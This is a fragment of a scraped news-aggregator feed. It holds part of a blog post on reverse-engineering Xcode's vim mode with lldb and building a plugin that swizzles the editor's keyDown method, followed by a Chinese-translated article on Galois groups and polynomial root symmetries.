__C.NSEvent) -&gt; () + 47 frame  #12: 0x7fff22e2f908 AppKit`-[NSWindow(NSEventRouting) _reallySendEvent:isDelayedEvent:] + 6482 frame  #13: 0x7fff22e2dd96 AppKit`-[NSWindow(NSEventRouting) sendEvent:] + 347 frame  #14: 0x104f16674 IDEKit`-[IDEWorkspaceWindow sendEvent:] + 154 frame  #15: 0x7fff22e2cc11 AppKit`-[NSApplication(NSEvent) sendEvent:] + 3021 frame  #16: 0x104f5a189 IDEKit`-[IDEApplication sendEvent:] + 857 frame  #17: 0x7fff23104f71 AppKit`-[NSApplication _handleEvent:] + 65 frame  #18: 0x7fff22c9506e AppKit`-[NSApplication run] + 623 frame  #19: 0x1039f4e84 DVTKit`-[DVTApplication run] + 54 frame  #20: 0x7fff22c6924c AppKit`NSApplicationMain + 816 frame  #21: 0x7fff203c1f3d libdyld.dylib`start + 1 frame  #22: 0x7fff203c1f3d libdyld.dylib`start + 1\n  Starting at the bottom, some general app/window logic that&#39;s slowly bubbling up an  NSEvent (frame  #17 up through  #12)\n There&#39;s more vim handling above that as well, but things become messier as we go.\n   Now that we have even the smallest insight into what the control flow for a vim command looks like,it&#39;s clear that we&#39;re probably not going to be able to understand the whole system without a lot of effort:there are events, event consumers, event consumer contexts, commands, command interfaces, command handlers&amp;mldrI&#39;d probably have trouble wrapping my head around it even with source code &amp; documentation.\n Instead, let&#39;s find a smaller area to focus on. We mostly just want to tell Xcode that it&#39;s actually receiving different inputs.That&#39;s not all we need to do - at some point, we will have to figure out how to do things like check which vim mode we&#39;re currently in -but we can burn that bridge when we get to it.\n Let&#39;s start with the  IDESourceEditor.IDEViEventConsumer.handleKeyEvent method that we called out above.It&#39;s the lowest vim-specific frame in the stack; low enough that it&#39;s only really dealing with  NSEvent, sowhatever logic handles mapping a keypress to a command likely happens after this point.\n We can disable our original breakpoint and add a new one on this  IDEViEventConsumer.handleKeyEvent method:\n  Back in Xcode, we can now hit any key to reach our breakpoint, since we&#39;re no longer breaking on character-replacement-logic;I&#39;ll start by using the mouse to move to Line 1, and then hitting the  j key, which should move us down to Line 2; and the breakpoint is indeed hit!\n  Target 0:  (Xcode ) stopped. (lldb ) po  $arg1NSEvent:  type =KeyDown  loc = (544.636,595.392 )  time =111097.2  flags =0x100  win =0x7fb9ace853b0  winNum = 7437  ctxt =0x0  chars = &#34;j&#34;  unmodchars = &#34;j&#34;  repeat = 0  keyCode = 38\n There&#39;s our  j keypress - makes sense so far. If we type  continue in  lldb, and go back to Xcode, we&#39;ll see we&#39;ve moved down to Line 2.\n Now let&#39;s see if we can actually impact the result of a keypress. Back in Xcode, we can hit  j again, starting the move down to Line 3.\n In lldb though, we&#39;ll skip out on this method&#39;s logic entirely and simply return early. Based on the stacktrace above, our  IDEViEventConsumer.handleKeyEventmethod is expected to return a  Bool - likely indicating whether or not it actually handled the key event. Let&#39;s start by returning  true early:\n Target 0:  (Xcode ) stopped. (lldb ) thread  return  true* thread  #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 3.1 (lldb )  continue\n After checking back in Xcode, we&#39;re still on Line 2! This makes sense - we&#39;ve effectively said that  IDEViEventConsumer.handleKeyEvent has successfully handled the keyevent, but didn&#39;t actually do anything with it.\n Let&#39;s try the inverse. We&#39;re still on Line 2; hitting  j again brings us back to our breakpoint:\n Target 0:  (Xcode ) stopped. (lldb ) thread  return  false* thread  #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 3.1 (lldb )  continue\n    Saying that  IDEViEventConsumer did not handle the key event meant a  j character was insertedinto our line, despite us having been in normal mode (in fact, we still are).\n  IDEViEventConsumer.handleKeyEvent is expected to handle all keypresses when Vim Mode is enabled.Our  thread return false meant that we fell back to some non-vim-mode handler, which naturally just inserted a  j character; this wouldn&#39;t happen in normal use.\n IDEViEventConsumer.handleKeyEvent actually only handles  some keypresses in vim mode, like for navigation or switching between modes.General typing in insert mode is handled by some other event consumer later in the chain.\n That distinction might affect our path forward here, so let&#39;s see if we can figure out which is true.The easiest way to do that is to check what values this method is returning in different scenarios.\n Back in Xcode, another  j press to hit our breakpoint - this time, let&#39;s step out of the frame, and then check the  rax register to see what value was returned:\n Note: If you&#39;re trying to replicate the steps in this post on an M1-based Mac, the return value here should be in $x0 instead; note that I haven&#39;t tested any part of this post on an M1 though - sorry!\n (lldb ) finish* thread  #1, queue = &#39;com.apple.main-thread&#39;, stop reason = step out (lldb ) p  $rax (unsigned long )  $7  =  1\n That  1 indcates that our method returned  true, and was responsible for handling our  j press accordingly.Next, let&#39;s enter insert mode; we can follow the same process to see a return value of  1 again for the  i keypress that entered the mode.\n  (lldb ) finish* thread  #1, queue = &#39;com.apple.main-thread&#39;, stop reason = step out (lldb ) p  $rax (unsigned long )  $9  =  0\n That confirms it -  IDEViEventConsumer.handleKeyEvent is not actually responsible for handling events in insert mode.In that case, we&#39;ll want to hook into things one level down on the stack, in  SourceEditor.SourceEditorView.keyDown.\n This might make some things harder (like figuring out vim-specific context like what mode we&#39;re in; presumably, that would have been easier to access from a class called  IDEViEventConsumer!), but it&#39;s necessary in order for us to manipulate events within insert mode.\n Then again, it might make some things a lot easier - from the stacktrace above, it looks like there is an  @objc entrance to  SourceEditor.SourceEditorView.keyDown,meaning we should be able to swizzle it. That&#39;ll save us a good amount of headache over trying to hook a swift-only method.\n   This could probably be split out into its own post at some point, since I always struggle to find a somewhat up-to-date set of steps for making an Xcode Plugin.I think there are a few templates around that could be useful, but I usually prefer to know what I&#39;m changing, especially when there are few enough steps, so:\n Start with File &gt; New Project, and pick the macOS Bundle template.Project Name (I&#39;m using  XcodeVimMap) and Organization Identifier are up to you, but change the Bundle Extension to  xcplugin.\n Add a new Obj-C Header / Implementation file using File &gt; New &gt; File, Cocoa Class. I&#39;ll use my project name for this class name as well -  XcodeVimMap.\n In the Info.plist of the bundle, add a new  DVTPlugInCompatibilityUUIDs key of type  array.Add the associated UUID of the Xcode app version you&#39;re developing for as a  string item within the array; you can get the UUID using:\n   Update the  Principal Class key to the name of the class you created. This is not strictly needed if you only have one class, but can save you some pain later.\n If this is the first Xcode plugin you&#39;re installing for this copy of Xcode, re-sign Xcode (this can cause issues with your Xcode installation,but I&#39;m not really qualified to know what they are or speak much about them; but probably do some research is this if your first foray into plugins).\n  If you set up everything correctly, you should get a prompt within Xcode asking you if you want to load the bundle ( Unexpected code bundle &#34;...&#34;). Note that the button you want is the non-highlighted one.After loading the bundle, you should see the  XcodeVimMap Loaded output in your terminal.\n Note: If you see any output about the plugin not being loaded, such as  Skipping plug-in at path &#39;.../XcodeVimMap.xcplugin&#39;,it&#39;s likely related to the Info.plist values specified above; double-check them before anything else.\n If everything worked, there are two additional steps you can do to make development quicker:\n In your target&#39;s Build Settings, change  Installation Build Products Location to  $(HOME), and  Installation Directory to  /Library/Application Support/Developer/Shared/Xcode/Plug-ins.This will prevent you from having to copy the product over after each build.\n In your scheme&#39;s settings, on the Run tab, and the Info sub-tab, change your  Executable to be the copy of Xcode that you&#39;re developing for.This will let you hit the Run button to launch another instance of Xcode after building, see its log output, and debug it. Note that as of writing,you&#39;ll also have to uncheck  Enable user interface debugging in the Options sub-tab, or you&#39;ll get an error message about being unable to load a debugger plugin.\n Xcode is fairly slow with a debugger attached,so if the debugger isn&#39;t a core part of your workflow,it&#39;s worth unchecking the  Debug executable box in the Info sub-tab -though we will be using it for parts of this post.\n With all that out of the way, we now have a general Xcode plugin set up - we can now start adding some vim-specific code to it.\n   We determined earlier that  SourceEditor.SourceEditorView.keyDown was likely the ideal method to target here, so let&#39;s start by swizzling it in our plugin.\n First, let&#39;s add a breakpoint on our  NSLog statement in  pluginDidLoad:so we can see if the class we want to swizzle is actually loaded by this point:\n  Looks like the class isn&#39;t loaded yet. We know it&#39;s defined in the  SourceEditor framework, which we saw the path fornear the top of this post; we can load it early ourselves using  dlopen:\n // #import &lt;dlfcn.h&gt; for dlopen  NSString  * xcodePath  =  [ [ NSBundle  mainBundle ]  bundlePath ] ; NSString  * sourceEditorPath  =  [ xcodePath  stringByAppendingPathComponent : @&#34; Contents/SharedFrameworks/SourceEditor.framework/Versions/A/SourceEditor &#34; ] ; dlopen ( [ sourceEditorPath  cStringUsingEncoding : NSUTF8StringEncoding ] ,  RTLD_NOW ) ; NSLog ( @&#34; [XcodeVimMap] SourceEditor Loaded &#34; ) ;\n If we add a breakpoint on this new  NSLog statement and re-run, we can confirm our class is now loaded:\n  We should now be able to set up our swizzle accordingly. Note that I&#39;m using a bit of aweird format where we keep a reference to the original implementation in a function pointerrather than just using  method_exchangeImplementations; I ran into some oddness with the usual setup,and would rather save the related debugging effort for elsewhere in this post - something tells me I&#39;ll need it.\n // #import &lt;AppKit/AppKit.h&gt; for NSEvent  // #import &lt;objc/runtime.h&gt; for runtime fun  // Holds the original method implementation  static  BOOL ( * originalKeyDown ) ( id  self ,  SEL  _cmd ,  NSEvent  * event ) ; // Log keypress events, then forward to original implementation  -  ( BOOL ) swizzled_keyDown: ( NSEvent  * ) event  {  NSLog ( @&#34; [XcodeVimMap] Got Characters: %@ &#34; ,  event . characters ) ;  return  originalKeyDown ( self ,  _cmd ,  event ) ; } +  ( void ) pluginDidLoad: ( NSBundle  * ) plugin  {  // ...   Method  originalMethod  =  class_getInstanceMethod (  NSClassFromString ( @&#34; SourceEditor.SourceEditorView &#34; ) ,  NSSelectorFromString ( @&#34; keyDown: &#34; ) ) ;  Method  replacementMethod  =  class_getInstanceMethod (  [ self  class ] ,  @selector ( swizzled_keyDown : ) ) ;  // Save the original implementation so we can   // call it from `swizzled_keyDown`   originalKeyDown  =  ( void  * ) method_getImplementation (  originalMethod ) ;  // Replace the method   method_setImplementation (  originalMethod ,  method_getImplementation ( replacementMethod ) ) ; }\n  [XcodeVimMap] Plugin Loaded[XcodeVimMap] SourceEditor Loaded[XcodeVimMap] Got Characters: G (// move to end of file)[XcodeVimMap] Got Characters: i (// switch to insert mode)[XcodeVimMap] Got Characters: H[XcodeVimMap] Got Characters: e[XcodeVimMap] Got Characters: l[XcodeVimMap] Got Characters: l[XcodeVimMap] Got Characters: o[XcodeVimMap] Got Chara\n......", "posttime": "2021-08-05 20:51:31", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "xcode,sourceeditor", "title": "\u8bf4\u670d Xcode \u6620\u5c04 Vim \u952e", "title_en": "Convincing Xcode to map Vim keys", "transed": 1, "url": "https://bryce.co/xcode-vim-map/", "via": "", "real_tags": ["xcode"]}, {"category": "", "categoryclass": "", "imagename": "c0e1be35788304c1f8d3f08471141a59.png", "infoid": 1071326, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u6ca1\u610f\u89c1 \uff1a", "note_en": "No comments :", "posttime": "2021-08-05 20:51:19", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "linux,kernel,\u610f\u89c1", "title": "\u6b63\u786e\u5b8c\u6210 Linux \u5185\u6838\u5b89\u5168", "title_en": "Linux Kernel Security Done Right", "transed": 1, "url": "https://security.googleblog.com/2021/08/linux-kernel-security-done-right.html", "via": "", "real_tags": ["linux", "kernel", "\u610f\u89c1"]}, {"category": "", "categoryclass": "", "imagename": "2c41db9ff2773d25c9a9be582335b262.jpg", "infoid": 1071325, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u5728 20 \u5c81\u7684\u51b3\u6597\u4e2d\u53d7\u81f4\u547d\u4f24\u4e4b\u524d\uff0c\u00c9variste Galois \u53d1\u73b0\u4e86\u591a\u9879\u5f0f\u65b9\u7a0b\u7684\u9690\u85cf\u7ed3\u6784\u3002\u901a\u8fc7\u7814\u7a76\u4ed6\u4eec\u7684\u89e3\u51b3\u65b9\u6848\u4e4b\u95f4\u7684\u5173\u7cfb\u2014\u2014\u800c\u4e0d\u662f\u4ed6\u4eec\u81ea\u5df1\u7684\u89e3\u51b3\u65b9\u6848\u2014\u2014\u4ed6\u521b\u9020\u4e86\u65b0\u7684\u6982\u5ff5\uff0c\u8fd9\u4e9b\u6982\u5ff5\u5df2\u7ecf\u6210\u4e3a\u8bb8\u591a\u6570\u5b66\u5206\u652f\u7684\u91cd\u8981\u7ec4\u6210\u90e8\u5206\u3002\u6ca1\u6709\u4eba\u77e5\u9053\u4e3a\u4ec0\u4e48\u4f3d\u7f57\u74e6\u5728 1832 \u5e74 5 \u6708 30 \u65e5\u6e05\u6668\u53d1\u73b0\u81ea\u5df1\u5728\u5df4\u9ece\u51b3\u6597\u573a\uff0c\u4f46\u524d\u4e00\u5929\u665a\u4e0a\uff0c\u4f20\u8bf4\u4ed6\u71ac\u591c\u5b8c\u6210\u4e86\u4ed6\u6700\u540e\u7684\u624b\u7a3f\u3002\u4ed6\u5728\u90a3\u91cc\u5199\u9053\uff1a\u4f3d\u7f57\u74e6\u7684\u6cd5\u4ee4\u662f\u4ece\u6570\u5b66\u56f0\u5883\u4e2d\u4ea7\u751f\u7684\u3002\u5728 1500 \u5e74\u4ee3\uff0c\u6570\u5b66\u5bb6\u7814\u7a76\u4e86\u591a\u9879\u5f0f\uff0c\u5982 x 2 \u2212 2 \u548c x 4 \u2212 10 x 2 + 22\u3002\u4ed6\u4eec\u8bd5\u56fe\u627e\u5230\u7b80\u5355\u7684\u516c\u5f0f\u6765\u8ba1\u7b97\u8fd9\u4e9b\u591a\u9879\u5f0f\u7684\u6839\u2014\u2014\u6784\u6210\u65b9\u7a0b\u7684 x \u7684\u503c\u7b49\u4e8e\u96f6\u2014\u2014\u4f46\u53ea\u6709\u5728\u6700\u9ad8\u6307\u6570\u4e0d\u5927\u4e8e 4 \u65f6\u624d\u80fd\u627e\u5230\u5b83\u4eec\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u4f3d\u7f57\u74e6\u81ea\u5df1\u8bc1\u660e\u4e86\u8fd9\u6837\u7684\u516c\u5f0f\u4e0d\u5b58\u5728\u3002\u6240\u4ee5\u4ed6\u8bbe\u8ba1\u4e86\u4e00\u79cd\u7814\u7a76\u6839\u7684\u65b0\u65b9\u6cd5\uff1a\u4ed6\u610f\u8bc6\u5230\u4ed6\u53ef\u4ee5\u7814\u7a76\u5b83\u4eec\u4e4b\u95f4\u7684\u4ee3\u6570\u5173\u7cfb\uff0c\u800c\u4e0d\u662f\u7cbe\u786e\u5730\u8ba1\u7b97\u5b83\u4eec\u2014\u2014\u5173\u6ce8\u5b83\u4eec\u7684\u590d\u6742\u6027\uff0c\u800c\u4e0d\u662f\u5b83\u4eec\u7684\u5916\u89c2\u3002\u5728\u7cbe\u795e\u4e0a\uff0c\u4ed6\u7684\u89c2\u70b9\u7c7b\u4f3c\u4e8e\u8003\u8651\u5f62\u72b6\u7684\u4e0d\u540c\u5bf9\u79f0\u6027\u3002\u8fd9\u4e9b\u662f\u91cd\u65b0\u5b9a\u4f4d\u5f62\u72b6\u4ee5\u4f7f\u5176\u770b\u8d77\u6765\u4ecd\u7136\u76f8\u540c\u7684\u5404\u79cd\u65b9\u6cd5\uff0c\u4f8b\u5982\u5c06\u6b63\u65b9\u5f62\u65cb\u8f6c 180 \u5ea6\u3002\u591a\u9879\u5f0f\u6839\u4e4b\u95f4\u7684\u5bf9\u79f0\u6027\u662f\u4ea4\u6362\u5b83\u4eec\u7684\u65b9\u6cd5\uff0c\u4ee5\u4fbf\u5b83\u4eec\u4fdd\u6301\u76f8\u540c\u7684\u4ee3\u6570\u5173\u7cfb\u3002\u6b63\u5982\u67d0\u4e9b\u5f62\u72b6\u6bd4\u5176\u4ed6\u5f62\u72b6\u5177\u6709\u66f4\u591a\u5bf9\u79f0\u6027\uff08\u5706\u5f62\u6709\u65e0\u6570\u4e2a\uff1b\u6b63\u65b9\u5f62\u53ea\u6709\u516b\u4e2a\uff09\uff0c\u60a8\u53ef\u4ee5\u66f4\u81ea\u7531\u5730\u91cd\u65b0\u6392\u5217\u67d0\u4e9b\u591a\u9879\u5f0f\u65b9\u7a0b\u7684\u6839\uff0c\u800c\u4e0d\u662f\u91cd\u65b0\u6392\u5217\u5176\u4ed6\u591a\u9879\u5f0f\u7684\u6839\u3002 \u201c\u91cd\u65b0\u6392\u5217\u6839\u7684\u67d0\u4e9b\u65b9\u6cd5\u53ef\u80fd\u4e0e\u4ee3\u6570\u89c4\u5219\u4e0d\u517c\u5bb9\u3002\u4ece\u8fd9\u4e2a\u610f\u4e49\u4e0a\u8bf4\uff0c\u6839\u6e90\u53ef\u80fd\u65e0\u6cd5\u5b8c\u5168\u4e92\u6362\uff0c\u201d\u65af\u5766\u798f\u5927\u5b66\u7684\u5e03\u83b1\u6069\u5eb7\u62c9\u5fb7\u8bf4\u3002\n\u5728\u4fdd\u6301\u4ee3\u6570\u4e00\u81f4\u6027\u7684\u540c\u65f6\u6839\u53ef\u4ee5\u76f8\u4e92\u4ea4\u6362\u7684\u7a0b\u5ea6\u662f\u4e00\u4e2a\u5fae\u5999\u7684\u7279\u6027\uff0c\u5b83\u544a\u8bc9\u6570\u5b66\u5bb6\u5f88\u591a\u5173\u4e8e\u5982\u4f55\u8bc6\u522b\u4ec5\u901a\u8fc7\u89c2\u5bdf\u65e0\u6cd5\u770b\u5230\u7684\u591a\u9879\u5f0f\u7279\u5f81\u3002\u901a\u8fc7\u793a\u4f8b\u6700\u5bb9\u6613\u770b\u5230\u3002\u8ba9\u6211\u4eec\u770b\u770b\u4e24\u4e2a\uff0c\u6bcf\u4e2a\u90fd\u6709\u4e09\u4e2a\u6839\uff08\u56e0\u4e3a\u6bcf\u4e2a\u7684\u6700\u9ad8\u6307\u6570\u662f 3\uff09\uff1a\u5728\u7eb8\u9762\u4e0a\uff0c\u5b83\u4eec\u51e0\u4e4e\u76f8\u540c\u3002\u4f46\u5728\u5e55\u540e\uff0c\u4e00\u4e2a\u7684\u6839\u53ef\u4ee5\u6bd4\u53e6\u4e00\u4e2a\u7684\u6839\u4ee5\u66f4\u591a\u7684\u65b9\u5f0f\u91cd\u65b0\u6392\u5217\u3002\u8ba9\u6211\u4eec\u9996\u5148\u5173\u6ce8 f(x)\u3002\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u6709\u4e09\u4e2a\u6839\uff1aa\u3001b \u548c c\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5bf9\u6839\u5bf9\u7684\u4e58\u79ef\u5e76\u5c06\u5b83\u4eec\u52a0\u5728\u4e00\u8d77\uff0c\u4ee5\u4ee3\u6570\u65b9\u5f0f\u7ec4\u5408\u5b83\u4eec\u4ee5\u5f97\u5230\u4e00\u4e2a\u65b0\u503c\u3002\u5bf9\u4e8e\u6240\u6709\u4e09\u6b21\u591a\u9879\u5f0f\uff08\u6700\u9ad8\u6307\u6570\u4e3a 3 \u7684\u4e09\u6b21\u591a\u9879\u5f0f\uff09\uff0c\u4e09\u6b21\u591a\u9879\u5f0f\u7684\u7cfb\u6570\u4e3a 1\uff0c\u4f17\u6240\u5468\u77e5\uff0c\u8fd9\u4e2a\u7531\u6839\u6784\u6210\u7684\u7279\u5b9a\u4ee3\u6570\u8868\u8fbe\u5f0f\u603b\u662f\u7b49\u4e8e\u7ebf\u6027\u9879\u7684\u7cfb\u6570\uff0c\u6216\u8005\u88ab\u63d0\u5347\u4e3a\u7b2c\u4e00\u79cd\u529b\u91cf\u3002\u5728\u6211\u4eec\u7684\u793a\u4f8b\u4e2d\uff0c\u8fd9\u662f -7\u3002\u73b0\u5728\u8ba9\u6211\u4eec\u91cd\u65b0\u6392\u5217\u6839\uff0c\u4e0d\u7406\u4f1a c\uff0c\u4f46\u4ea4\u6362 a \u548c b\u3002\u6211\u4eec\u5f97\u5230\uff1a \u4ee5\u8fd9\u79cd\u65b9\u5f0f\u91cd\u65b0\u6392\u5217\u6839\u53ef\u4ee5\u4fdd\u7559\u5b83\u4eec\u4e4b\u95f4\u7684\u4ee3\u6570\u5173\u7cfb\uff1a\u8be5\u7b49\u5f0f\u4ecd\u7136\u6210\u7acb\uff0c\u56e0\u4e3a\u4e58\u6cd5\u548c\u52a0\u6cd5\u662f\u53ef\u4ea4\u6362\u7684\uff0c\u8fd9\u610f\u5473\u7740\u4ea4\u6362\u4e8b\u7269\u7684\u987a\u5e8f\u2014\u2014\u6bd4\u5982\u5c06\u6839\u6539\u7ec4\u2014\u2014\u4e0d\u4f1a\u6539\u53d8\u7b54\u6848\u3002\u4e8b\u5b9e\u4e0a\uff0c\u5bf9\u4e8e\u8fd9\u4e2a\u4f8b\u5b50\uff0c\u91cd\u65b0\u6392\u5217\u6839\u7684\u6240\u6709\u516d\u79cd\u53ef\u80fd\u7684\u65b9\u5f0f\uff08\u5305\u62ec\u5b83\u4eec\u4e0d\u6539\u53d8\u7684\u65b9\u5f0f\uff09\u90fd\u4fdd\u7559\u4e86\u5173\u7cfb\uff1a a, b, c: ab + ac + bc = \u2212 7 b, a, c: ba + bc + ac = \u22127 c, b, a: cb + ca + ba = \u22127 a, c, b: ac + ab + cb = \u22127 b, c, a: bc + ba + ca = \u22127 c, a, b: ca + cb + ab = \u22127 \u73b0\u5728\u8ba9\u6211\u4eec\u770b\u7b2c\u4e8c\u4e2a\u591a\u9879\u5f0f\uff0cg( x) = x 3 \u2212 7 x + 7\u3002\u5982\u679c\u6211\u4eec\u79f0\u6839\u4e3a r, s \u548c t\uff0c\u90a3\u4e48\u4e00\u4e2a\u7c7b\u4f3c\u7684\u65b9\u7a0b\u5230 f( x) \u7684\u90a3\u4e2a\u4e5f\u6210\u7acb\uff1a\n\u8fd9\u5bf9\u4e8e\u521d\u59cb\u9879\u4e3a x 3 \u4e14\u7ebf\u6027\u9879\u4e3a -7 x \u7684\u4efb\u4f55\u4e09\u6b21\u591a\u9879\u5f0f\u90fd\u662f\u6b63\u786e\u7684\u3002\u540c\u6837\uff0c\u6240\u6709\u516d\u79cd\u53ef\u80fd\u7684\u6392\u5217\u4ecd\u7136\u7b49\u4e8e -7\u3002\u4f46\u5947\u602a\u7684\u662f\uff0c\u5bf9\u4e8e g(x)\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u7684\u90fd\u88ab\u8ba4\u4e3a\u662f\u591a\u9879\u5f0f\u7684\u5bf9\u79f0\u6027\u3002\u8fd9\u662f\u56e0\u4e3a\u5b83\u7684\u6839\u4e4b\u95f4\u7684\u4ee3\u6570\u5173\u7cfb\u66f4\u590d\u6742\uff1a\u5b83\u7684\u6839\u6ee1\u8db3\u4e00\u4e2a\u989d\u5916\u7684\u7279\u6b8a\u4ee3\u6570\u5173\u7cfb\u3002\u7279\u6b8a\u5173\u7cfb\u662f ( r \u2212 t)( r \u2212 s)( t \u2212 s) = 7 \uff08\u5047\u8bbe r \u5c0f\u4e8e s\uff0c\u5e76\u4e14 s \u5c0f\u4e8e t\uff09\u3002\u5176\u6839\u7684\u516d\u79cd\u53ef\u80fd\u91cd\u6392\u4e2d\u53ea\u6709\u4e09\u79cd\u4fdd\u7559\u4e24\u79cd\u4ee3\u6570\u5173\u7cfb\uff1ars + rt + st = 7 \u548c ( r \u2212 t)( r \u2212 s)( t \u2212 s) = 7: r, s, t: ( r \u2212 t)( r \u2212 s)( t \u2212 s) = 7 s, r, t: ( s \u2212 t)( s \u2212 r)( t \u2212 r) = \u22127 t, s, r: ( t \u2212 r)( t \u2212 s)( r \u2212 s) = \u22127 r, t, s: ( r \u2212 s)( r \u2212 t)( s \u2212 t) = \u22127 s, t, r: ( s \u2212 r)( s \u2212 t)( r \u2212 t) = 7 t, r, s: ( t \u2212 s)( t \u2212 r)( s \u2212 r) = 7 \u7c97\u4f53\u7684\u4e09\u4e2a\u91cd\u6392\u4fdd\u7559\u4e86\u6839\u4e4b\u95f4\u7684\u6240\u6709\u4ee3\u6570\u5173\u7cfb\uff0c\u751a\u81f3\u8d85\u51fa\u4e86\u8fd9\u4e24\u4e2a\u5173\u7cfb\u3002\u56e0\u6b64\uff0c\u8fd9\u4e09\u4e2a\u91cd\u6392\u88ab\u8ba4\u4e3a\u662f\u591a\u9879\u5f0f\u7684\u5bf9\u79f0\u6027\u3002\u4e4d\u4e00\u770b\uff0c\u8fd9\u4e24\u4e2a\u591a\u9879\u5f0f\u5177\u6709\u4e0d\u540c\u7684\u590d\u6742\u7a0b\u5ea6\u5e76\u4e0d\u660e\u663e\uff0c\u4f46\u662f\u5f53\u60a8\u91c7\u7528\u4f3d\u7f57\u74e6\u53d1\u660e\u7684\u89c6\u89d2\u65f6\uff0c\u5b83\u53d8\u5f97\u53ef\u89c1\u3002\u4f3d\u7f57\u74e6\u5c06\u4ed6\u7684\u601d\u7ef4\u65b9\u5f0f\u6253\u5305\u5728\u65b0\u5bf9\u8c61\u4e2d\u2014\u2014\u8fd9\u4e9b\u5bf9\u8c61\u540e\u6765\u88ab\u79f0\u4e3a\u4f3d\u7f57\u74e6\u7fa4\u2014\u2014\u8fd9\u4e9b\u5bf9\u8c61\u5bf9\u7ed9\u5b9a\u591a\u9879\u5f0f\u6839\u4e4b\u95f4\u7684\u4ee3\u6570\u5173\u7cfb\u7684\u590d\u6742\u6027\u8fdb\u884c\u4e86\u7f16\u7801\u3002\u5728\u8fd9\u4e9b\u5173\u7cfb\u4e2d\uff0c\u6839\u7684\u91cd\u6392\u53ef\u4ee5\u4e00\u4e2a\u63a5\u4e00\u4e2a\u5730\u5e94\u7528\uff0c\u4f46\u53ef\u4ee5\u64a4\u6d88\u5b83\u4eec\u4ee5\u8fd4\u56de\u5230\u60a8\u5f00\u59cb\u7684\u4f4d\u7f6e - \u5c31\u50cf\u60a8\u53ef\u4ee5\u5e94\u7528\u6b63\u65b9\u5f62\u7684\u5bf9\u79f0\u6027\u7136\u540e\u64a4\u6d88\u5b83\u4eec\u4ee5\u8fd4\u56de\u5230\u60a8\u5f00\u59cb\u7684\u786e\u5207\u4f4d\u7f6e\u548c\u3002\u8fd9\u4e2a\u60f3\u6cd5\u53cd\u6620\u4e86\u6570\u5b66\u4e2d\u7fa4\u7684\u4e00\u822c\u6982\u5ff5\uff0c\u5b83\u662f\u5bf9\u79f0\u6027\u7684\u96c6\u5408\uff0c\u65e0\u8bba\u5b83\u4eec\u9002\u7528\u4e8e\u5e73\u65b9\u8fd8\u662f\u591a\u9879\u5f0f\u7684\u6839\u3002\u4f3d\u7f57\u74e6\u7fa4\u662f\u7fa4\u6982\u5ff5\u7684\u7b2c\u4e00\u4e2a\u5b9e\u4f8b\uff0c\u4f3d\u7f57\u74e6\u7684\u601d\u60f3\u53d1\u5c55\u6210\u4e3a\u4eca\u5929\u5f3a\u5927\u7684\u3001\u65e0\u5904\u4e0d\u5728\u7684\u7814\u7a76\u9886\u57df\uff0c\u79f0\u4e3a\u7fa4\u8bba\u3002\n\u4f3d\u7f57\u74e6\u7fa4\u4e3a\u7814\u7a76\u591a\u9879\u5f0f\u65b9\u7a0b\u63d0\u4f9b\u4e86\u4e00\u4e2a\u5f3a\u5927\u7684\u89c6\u89d2\u3002\u5982\u679c\u60a8\u77e5\u9053\u591a\u9879\u5f0f\u7684\u4f3d\u7f57\u74e6\u7fa4\uff0c\u90a3\u4e48\u53ef\u4ee5\u901a\u8fc7\u8bbf\u95ee\u8bb8\u591a\u7fa4\u8bba\u5de5\u5177\u6765\u7406\u89e3\u5176\u6839\u7684\u884c\u4e3a\u3002\u901a\u8fc7\u8fd9\u79cd\u65b9\u6cd5\u83b7\u5f97\u7684\u89c1\u89e3\u6bd4\u901a\u8fc7\u5bf9\u591a\u9879\u5f0f\u672c\u8eab\u6267\u884c\u4ee3\u6570\u83b7\u5f97\u7684\u89c1\u89e3\u66f4\u6709\u542f\u53d1\u6027\u3002\u5bbe\u5915\u6cd5\u5c3c\u4e9a\u5927\u5b66\u7684\u6234\u7ef4\u00b7\u54c8\u5df4\u7279 (David Harbater) \u8bf4\uff1a\u201c[\u4f7f\u7528\u4f3d\u7f57\u74e6\u7fa4]\uff0c\u4f60\u4f1a\u5f97\u5230\u4e00\u6761\u4fe1\u606f\uff0c\u5b83\u4f1a\u4f20\u64ad\u5e76\u544a\u8bc9\u4f60\u66f4\u591a\u4fe1\u606f\u3002\u201d\u4f8b\u5982\uff0c\u4f3d\u7f57\u74e6\u7fa4\u4f1a\u7acb\u5373\u544a\u8bc9\u60a8\u4e00\u4e2a\u591a\u9879\u5f0f\u662f\u5426\u53ef\u4ee5\u6c42\u89e3\uff0c\u5e76\u5141\u8bb8\u60a8\u6bd4\u8f83\u4e0d\u540c\u591a\u9879\u5f0f\u7684\u5e95\u5c42\u7ed3\u6784\u3002\u4f3d\u7f57\u74e6\u7fa4\u4e5f\u53ef\u7528\u4e8e\u7814\u7a76\u4ee3\u6570\u548c\u6570\u8bba\u4e2d\u7684\u5404\u79cd\u6570\u5b66\u5bf9\u8c61\uff0c\u4ee5\u6253\u5f00\u89e3\u51b3\u5176\u4ed6\u95ee\u9898\u7684\u65b9\u6cd5\u3002 